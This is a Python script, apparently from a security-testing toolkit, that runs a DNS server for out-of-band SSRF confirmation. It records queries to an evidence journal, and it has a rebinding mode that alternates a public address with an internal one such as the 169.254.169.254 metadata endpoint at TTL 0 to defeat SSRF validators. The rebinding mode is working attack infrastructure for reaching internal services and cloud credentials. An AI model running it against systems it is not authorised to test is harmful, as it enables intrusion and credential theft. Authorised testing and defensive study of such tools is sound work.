#!/usr/bin/env python3
"""
dns-rebind.py — DNS interaction recorder and rebinding server (Grimnir confirmation harness).

Two modes, and the default is the one you reach for most:

  --mode record (default)
      Answers every A query with one address and APPENDS THE INTERACTION to the same
      evidence journal oob-listener.py writes. This closes the floor of the response-channel
      ladder. Plenty of targets resolve a hostname and are then blocked from connecting out,
      and with an HTTP-only listener that case is indistinguishable from "no SSRF at all" --
      so the lane gets closed as a negative when the primitive is real. A recorded DNS query
      proves the fetch was attempted and names the resolver that made it, which is an honest
      `blind` rung rather than a false negative (hunting Rules 27 and 32).

  --mode rebind
      Alternates per hostname: public address on the first answer, internal on the next, with
      TTL 0 so nothing is cached in between. Defeats a validator that resolves the URL, checks
      the address, and then lets a separate resolution perform the fetch.

Nonce correlation works the same as the HTTP listener: put the nonce in a label, e.g.
`gnab12...cd.oob.example.com`. Any label matching the mint format is picked out wherever it
sits; otherwise the leftmost label is recorded, so a hand-made name still correlates.

Usage:
  sudo python3 dns-rebind.py --domain oob.example.com --public 203.0.113.10
  sudo python3 dns-rebind.py --mode rebind --public 203.0.113.10 --internal 169.254.169.254 \
       --domain rebind.example.com

Needs NS delegation to this host for real target traffic (glue the zone at your registrar).
Quick local check: dig @127.0.0.1 -p 5353 gnabcdef0123456789.test

Env: GRIMNIR_OOB_LOG (evidence JSONL, default ~/.grimnir/oob/hits.jsonl)
"""
import argparse
import json
import os
import re
import socketserver
import threading
from collections import defaultdict
from datetime import datetime, timezone

from dnslib import QTYPE, RR, A, DNSHeader, DNSRecord, TXT

CONFIG = os.path.expanduser(os.environ.get("GRIMNIR_OOB_CONFIG", "~/.grimnir/oob/config.env"))


def _from_config(key, default=""):
    """Env wins, then the listener's config.env, then the default -- see oob-client.py."""
    v = os.environ.get(key)
    if v:
        return v
    try:
        with open(CONFIG) as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, val = line.partition("=")
                if k.strip() == key:
                    return val.strip().strip('"').strip("'")
    except OSError:
        pass
    return default


LOG = os.path.expanduser(_from_config("GRIMNIR_OOB_LOG", "~/.grimnir/oob/hits.jsonl"))
#: The mint format from oob-client.py: "gn" + 16 hex characters.
NONCE_RE = re.compile(r"^gn[0-9a-f]{16}$", re.I)
_log_lock = threading.Lock()


def extract_nonce(qname):
    labels = qname.rstrip(".").split(".")
    for label in labels:
        if NONCE_RE.match(label):
            return label.lower()
    return labels[0].lower() if labels and labels[0] else ""


def record(qname, qtype, src_ip, answer, mode):
    """Append one interaction in the shape oob-client.py already reads.

    Same file, same nonce key, so `poll` and `verdict` pick up DNS and HTTP hits together
    without either side learning about the other. `channel` is what tells them apart when
    it matters -- a DNS-only interaction must never be written up as a completed fetch.
    """
    rec = {
        "schema": 1,
        "ts": datetime.now(timezone.utc).isoformat(),
        "nonce": extract_nonce(qname),
        "channel": "dns",
        "port": 53,
        "src_ip": src_ip,
        "method": "DNS",
        "path": qname,
        "qtype": QTYPE.get(qtype, str(qtype)),
        "answer": answer,
        "mode": mode,
        "headers": {},
        "body": "",
    }
    try:
        with _log_lock:
            with open(LOG, "a") as fh:
                fh.write(json.dumps(rec) + "\n")
    except OSError as exc:
        print(f"[dns] journal write failed: {exc}", flush=True)
    return rec


class Handler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        srv = self.server
        try:
            query = DNSRecord.parse(data)
        except Exception as exc:
            print(f"[dns] unparseable query from {self.client_address[0]}: {exc}", flush=True)
            return
        qname = str(query.q.qname).rstrip(".")
        qtype = query.q.qtype
        reply = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q)

        if srv.domain and not (qname.lower() == srv.domain or
                               qname.lower().endswith("." + srv.domain)):
            # Out-of-zone: refuse rather than answer for names we are not authoritative for.
            reply.header.rcode = 5  # REFUSED
            sock.sendto(reply.pack(), self.client_address)
            return

        answer = None
        if qtype == QTYPE.A:
            if srv.mode == "rebind":
                # Per-hostname parity. A single global counter desynchronised on any
                # concurrent probe, A/AAAA pair or resolver retry, which silently flipped
                # the sequence and made the rebind land the wrong way round.
                with srv.counter_lock:
                    srv.counters[qname.lower()] += 1
                    n = srv.counters[qname.lower()]
                answer = srv.public_ip if n % 2 == 1 else srv.internal_ip
            else:
                answer = srv.public_ip
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(answer), ttl=srv.ttl))
        elif qtype == QTYPE.TXT:
            answer = "grimnir-oob"
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer), ttl=srv.ttl))
        # Anything else (AAAA above all) gets an empty NOERROR. Dropping the query instead --
        # which the first version did -- stalls the resolver until it times out and retries,
        # and each retry is another interaction that shifts a rebind sequence.

        sock.sendto(reply.pack(), self.client_address)
        rec = record(qname, qtype, self.client_address[0], answer, srv.mode)
        print(f"[dns] {rec['qtype']:5s} {qname} -> {answer or 'NOERROR/empty'}  "
              f"from {self.client_address[0]}  nonce={rec['nonce'] or '-'}", flush=True)


class Server(socketserver.ThreadingUDPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, handler, *, mode, public_ip, internal_ip, domain, ttl):
        self.mode = mode
        self.public_ip = public_ip
        self.internal_ip = internal_ip
        self.domain = (domain or "").lower().rstrip(".")
        self.ttl = ttl
        self.counters = defaultdict(int)
        self.counter_lock = threading.Lock()
        super().__init__(addr, handler)


def main():
    ap = argparse.ArgumentParser(description="DNS interaction recorder / rebinding server")
    ap.add_argument("--mode", choices=("record", "rebind"), default="record",
                    help="record: log every query (default). rebind: alternate public/internal.")
    ap.add_argument("--public", default="203.0.113.10", help="address answered first")
    ap.add_argument("--internal", default="127.0.0.1", help="rebind target (rebind mode)")
    ap.add_argument("--domain", default="", help="zone to answer for; others get REFUSED")
    ap.add_argument("--ttl", type=int, default=0,
                    help="answer TTL (default 0: nothing caches between the check and the fetch)")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--bind", default="0.0.0.0")
    a = ap.parse_args()

    os.makedirs(os.path.dirname(LOG), exist_ok=True)
    server = Server((a.bind, a.port), Handler, mode=a.mode, public_ip=a.public,
                    internal_ip=a.internal, domain=a.domain, ttl=a.ttl)
    print(f"[dns] mode={a.mode} on {a.bind}:{a.port}  zone={a.domain or '<any>'}  ttl={a.ttl}")
    if a.mode == "rebind":
        print(f"[dns] {a.public} <-> {a.internal}, alternating per hostname")
    else:
        print(f"[dns] answering A -> {a.public}; every query recorded")
    print(f"[dns] journal -> {LOG}   (oob-client.py poll <nonce> reads the same file)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[dns] bye")


if __name__ == "__main__":
    main()
